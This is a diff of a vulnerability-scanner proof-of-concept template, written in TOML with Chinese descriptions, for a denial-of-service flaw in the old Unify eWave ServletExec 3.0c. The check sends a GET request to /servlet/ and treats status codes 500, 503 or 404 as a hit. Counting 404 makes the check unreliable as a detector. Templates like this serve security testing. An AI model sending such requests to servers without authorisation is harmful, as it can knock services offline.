@@ -1,6 +1,6 @@
 [info]
 author = "ave"
-description = "向目标 ServletExec 服务器发送包含 /servlet/ 路径的 HTTP 请求，若服务器返回正常响应表明 ServletExec 正在运行，可触发异常导致拒绝服务"
+description = "通过向目标服务器发送包含 /servlet/ 路径的特制请求，触发 ServletExec JSP/Java servlet 引擎异常，验证服务是否出现拒绝服务。攻击者无需认证即可利用。"
 id = "POC-AVE-2000-0749"
 name = "Unify eWave ServletExec 3.0c 拒绝服务漏洞 PoC"
 severity = "medium"
@@ -11,19 +11,21 @@ vuln_id = [
 ]
 
 [poc]
-logic = "all"
+logic = "any"
 
 [[poc.requests]]
 method = "GET"
 path = "/{{BaseURL}}/servlet/"
 protocol = "http"
 
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
 [[poc.requests.matchers]]
 expect = true
-part = "body"
-type = "word"
-words = [
-    "ServletExec",
-    "servlet",
-    "200 OK",
+status = [
+    500,
+    503,
+    404,
 ]
+type = "status"
